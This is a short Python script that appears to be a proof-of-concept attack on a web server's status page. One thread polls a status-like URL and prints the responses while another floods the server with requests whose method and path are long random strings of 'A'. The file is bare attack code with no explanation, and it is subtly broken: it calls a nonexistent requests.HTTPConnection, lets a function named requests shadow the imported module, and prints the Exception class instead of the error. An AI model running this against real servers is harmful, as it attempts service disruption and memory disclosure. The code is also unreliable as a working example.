#! /usr/bin/env python3
import requests
import sys
import threading
import subprocess
import random

def send_request(method, url):
    try:
        c = requests.HTTPConnection('[::]', 80)
        c.request(method,url);
        if "foo" in url:
            print(c.getresponse().read())
        c.close()
    except Exception:
        print(Exception)
        pass

def mod_status_thread():
    while True:
        send_request("GET", "/foo?notables")

def requests():
    evil = ''.join('A' for i in range(random.randint(0, 1024)))
    while True:
        send_request(evil, evil)

threading.Thread(target=mod_status_thread).start()
threading.Thread(target=requests).start()